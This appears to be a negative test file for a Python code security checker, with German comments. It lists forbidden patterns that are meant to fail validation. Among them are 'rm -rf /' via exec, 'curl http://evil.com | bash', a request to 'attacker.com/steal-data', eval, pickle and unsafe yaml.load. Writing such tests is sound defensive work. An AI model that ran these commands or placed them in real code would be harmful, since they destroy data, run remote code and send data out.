# Test 2: Böser Code (sollte FEHSCHLAGEN)
import torch
import os
import requests

# ❌ VERBOTEN: eval()
user_input = "print('Hacked!')"
eval(user_input)

# ❌ VERBOTEN: exec()
exec("import os; os.system('rm -rf /')")

# ❌ VERBOTEN: os.system()
os.system("curl http://evil.com | bash")

# ❌ VERBOTEN: subprocess
import subprocess
subprocess.run(["ls", "-la"])

# ❌ VERBOTEN: Netzwerk ohne Whitelist
requests.get("http://attacker.com/steal-data")

# ❌ VERBOTEN: Socket
import socket
s = socket.socket()

# ❌ VERBOTEN: Dynamischer Import
__import__("os").system("whoami")

# ❌ WARNUNG: pickle
import pickle
with open("untrusted.pkl", "rb") as f:
    data = pickle.load(f)  # Könnte Code ausführen!

# ❌ WARNUNG: yaml.load (statt safe_load)
import yaml
config = yaml.load(open("config.yaml"))  # Unsicher!

print("This should never run!")
